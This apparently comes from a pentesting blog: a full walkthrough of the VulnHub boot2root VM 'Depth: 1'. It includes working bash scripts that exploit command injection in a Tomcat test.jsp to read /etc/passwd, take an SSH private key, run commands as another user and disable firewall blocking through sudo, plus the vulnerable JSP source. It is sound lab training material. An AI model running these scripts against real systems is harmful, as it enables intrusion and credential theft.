This post documents the complete walkthrough of Depth: 1, a boot2root VM created by Dan Lawson, and hosted at VulnHub. If you are uncomfortable with spoilers, please stop reading now.

Background
In Danâs own words:

Many times while conducting a pentest, I need to script something up to make my life easier or to quickly test an attack idea or vector. Recently I came across an interesting command injection vector on a web application sitting on a clientâs internet-facing estate. There was a page, running in Java, that allowed me to type arbitrary commands into a form, and have it execute them. While developer-provided web shells are always nice, there were a few caveats. The page was expecting directory listing style output, which was then parsed and reformatted. If the output didnât match this parsing, no output to me. Additionally, there was no egress. ICMP, and all TCP/UDP ports including DNS were blocked outbound.


I was still able to leverage the command injection to compromise not just the server, but the entire infrastructure it was running on. After the dust settled, the critical report was made, and the vulnerability was closed, I thought the entire attack path was kind of fun, and decided to share how I went about it. Since I enjoy being a free man and only occasionally visit prisons, Iâve created a simple boot2root style VM that has a similar set of vulnerabilities to use in a walkthrough.

Information Gathering
Letâs kick this off with a nmap scan to establish the services available in the host.
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.100.4
...
PORT     STATE SERVICE REASON         VERSION
8080/tcp open  http    syn-ack ttl 64 Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat

One open port? Well, I guess Iâve to brute-force my way to an attack surface.
Directory/File Enumeration
Letâs start with directory/file enumeration, using wfuzz and its associated wordlists.
# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -w /usr/share/wfuzz/wordlist/general/extensions_common.txt -c --hc 404 http://192.168.100.4:8080/FUZZFUZ2Z

We find /test.jsp. It may be interesting.
File Listing Checker
This is what I see when I navigate to http://192.168.100.4:8080/test.jsp with my browser.

After some tinkering with test.jsp to get output, command execution is possible but the command output must conform to the following:

Output must not be empty; and
Output must be more than eight tokens, delimited by one or more space.

For some reason, the HTML table shows token two, three, four, eight, and beyond. Iâm able to leverage hexdump to act like cat to display /etc/passwd like so.

I wrote cat.sh to extract and display the printable ASCII characters from the hexadecimal numbers.
cat.sh
#!/bin/bash

_HOST=192.168.100.4
_PORT=8080
_TEST=test.jsp
_PATH=path
__CAT="hexdump -C "
__CMD="${__CAT}$1"

function urlencode() {
    old_lc_collate=$LC_COLLATE
    LC_COLLATE=C

    local length="${#1}"
    for (( i = 0; i &lt; length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%%%02X' "'$c" ;;
        esac
    done

    LC_COLLATE=$old_lc_collate
}

CMD=$(urlencode "$__CMD")

curl -s $_HOST:$_PORT/$_TEST?$_PATH=$CMD \
| grep '|' \
| cut -d'|' -f2 \
| tr -d '\n' \
| tr '.' '\n'

This is how /etc/passwd looks likeâtomcat8 and bill.
# ./cat.sh /etc/passwd
...
tomcat8:x:112:115::/usr/share/tomcat8:/bin/false
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash

This is how their respective home directories look like.

Notice that tomcat8 has a .ssh directory?

Notice that bill can sudo as root?
This is how test.jsp looks like.
&lt;%@ page import="java.util.*,java.io.*,java.util.regex.*"%&gt;
...
&lt;%
    if (request.getParameter("path") != null) {
        String delims = "[ ]+";
        out.println("Command: " + request.getParameter("path") + "&lt;BR&gt;");
        Process p = Runtime.getRuntime().exec(request.getParameter("path"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        out.println("&lt;table border='1'&gt;&lt;tr&gt;&lt;th&gt;Owner&lt;/th&gt;&lt;th&gt;Group&lt;/th&gt;&lt;th&gt;Size&lt;/th&gt;&lt;th&gt;Filename&lt;/th&gt;&lt;/tr&gt;");

        String disr = dis.readLine();
        while ( disr != null ) {
            String[] tokens = disr.split(delims);

            if (tokens.length &gt; 8) {
                out.println("&lt;tr&gt;");
                out.println("&lt;td&gt;" + tokens[2] + "&lt;/td&gt;");
                out.println("&lt;td&gt;" + tokens[3] + "&lt;/td&gt;");
                out.println("&lt;td&gt;" + tokens[4] + "&lt;/td&gt;");
                String[] filename = Arrays.copyOfRange(tokens, 8, tokens.length);
                String fname = String.join(" ", filename);
                out.println("&lt;td&gt;" + fname + "&lt;/td&gt;");
                out.println("&lt;/tr&gt;");

                //out.println(tokens.length);
                //out.println(disr);
                disr = dis.readLine();
            } else {
                disr =dis.readLine();
            }
        }
        out.println("&lt;/table&gt;");

    }
%&gt;

Iâm able to run ps faux and notice that sshd is running. ufw, a firewall, is also running based on whatâs in /etc/ufw/ufw.conf.
# ./cat.sh /etc/ufw/ufw.conf
# /etc/ufw/ufw.conf
#

# Set to yes to start on boot If setting this remotely, be sure to add a rule
# to allow your remote connection before starting ufw. Eg: 'ufw allow 22/tcp'
ENABLED=yes

# Please use the 'ufw' command to set the loglevel. Eg: 'ufw logging medium'
# See 'man ufw' for details.
LOGLEVEL=low

This explains why thereâs one open port from the earlier nmap scan. SSH is probably blocked by the firewall.
The Key to a Manâs Heart Is Through His Stomach
With cat.sh, combined with the directory listing from test.jsp, Iâm able to discover and extract tomcat8âs SSH key pair from its home directory.

I take an educated guess, put two and two together, and gather that tomcat8 probably has its public key listed in /home/bill/.ssh/authorized_keys. If thatâs the case, I should be able to log in to billâs account via SSH in localhost. Well, letâs find out and as Yoda put it, âDo or do not. Thereâs no try.â
Kill Bill: Vol. 1
I know one can execute a command upon login via SSH. But first, letâs see if I can log in as bill with tomcat8âs private key.

Holy smoke. Iâm able to execute remote commands and overcome the output display restrictions by adding my own placeholders.
With this in mind, I wrote cmd.sh, a script that displays the proper output from the commands as if bill is the one executing in a shell.
cmd.sh
#!/bin/bash

_HOST=192.168.100.4
_PORT=8080
_TEST=test.jsp
_PATH=path
__KEY=/usr/share/tomcat8/.ssh/id_rsa
__SSH="ssh -i $__KEY [email protected]"
__SEQ="echo 0 1 2 3 4 5 6 7"
__CMD="$__SSH sh -c '$__SEQ XXX$1 | base64XXX' "

urlencode() {
    old_lc_collate=$LC_COLLATE
    LC_COLLATE=C

    local length="${#1}"
    for (( i = 0; i &lt; length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%%%02X' "'$c" ;;
        esac
    done

    LC_COLLATE=$old_lc_collate
}

CMD=$(urlencode "$__CMD")

curl -s $_HOST:$_PORT/$_TEST?$_PATH=${CMD//XXX/%60} \
| grep -P '^&lt;td&gt;' \
| sed -e '4!d' -e 's/^&lt;td&gt;//' -e 's/&lt;\/td&gt;$//' \
| tr ' ' '\n' \
| base64 -d

Kill Bill: Vol. 2
Letâs give it a spin.
# ./cmd.sh "sudo -l"
Matching Defaults entries for bill on b2r:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bill may run the following commands on b2r:
    (ALL : ALL) NOPASSWD: ALL

As expected, letâs abuse this privilege to enable SSH in the firewall and give myself a proper shell.
# ./cmd.sh "sudo ufw allow ssh"
Rule added
Rule added (v6)

From my attacking machine, I can now login as bill and sudo as root.


Where Is the Flag?

Well, that wasnât difficult, was it?
